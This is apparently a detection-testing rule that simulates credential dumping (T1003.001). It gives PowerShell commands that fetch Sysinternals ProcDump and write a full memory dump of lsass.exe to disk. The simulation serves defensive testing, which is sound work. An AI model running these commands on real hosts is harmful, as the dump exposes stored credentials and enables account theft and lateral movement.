## Rule 001 - LSASS Memory Dump (ProcDump) (T1003.001)

### Purpose
Simulate credential dumping behavior by using ProcDump to dump `lsass.exe` memory.

### Commands (Windows VM, Admin PowerShell)
```powershell
mkdir C:\Tools -Force | Out-Null

cd C:\Tools

iwr https://live.sysinternals.com/procdump.exe -OutFile procdump.exe

.\procdump.exe -accepteula -ma lsass.exe C:\Tools\lsass.dmp
